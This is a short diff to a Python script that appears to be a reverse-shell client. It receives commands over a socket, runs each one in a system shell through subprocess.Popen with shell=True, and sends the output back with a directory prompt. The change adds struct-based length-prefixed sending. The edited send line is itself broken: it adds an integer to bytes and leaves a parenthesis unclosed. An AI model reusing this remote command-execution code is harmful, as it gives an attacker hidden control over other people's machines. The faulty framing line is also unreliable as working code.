@@ -2,7 +2,7 @@ import os
 import socket
 import subprocess
 import time
-
+import struct
 
 # Create a socket
 def socket_create():
@@ -51,7 +51,8 @@ def receive_commands():
                 cmd = subprocess.Popen(data[:].decode("utf-8"), shell=True, stdout=subprocess.PIPE, stderr=subprocess.PIPE, stdin=subprocess.PIPE)
                 output_bytes = cmd.stdout.read() + cmd.stderr.read()
                 output_str = str(output_bytes, "utf-8")
-                s.send(str.encode(output_str + str(os.getcwd()) + '> '))
+                sent_message = str.encode(output_str + str(os.getcwd()) + '> ')
+                s.send(struct.pack('>I', len(sent_message) + sent_message)
                 print(output_str)
             except:
                 output_str = "Command not recognized" + "\n"
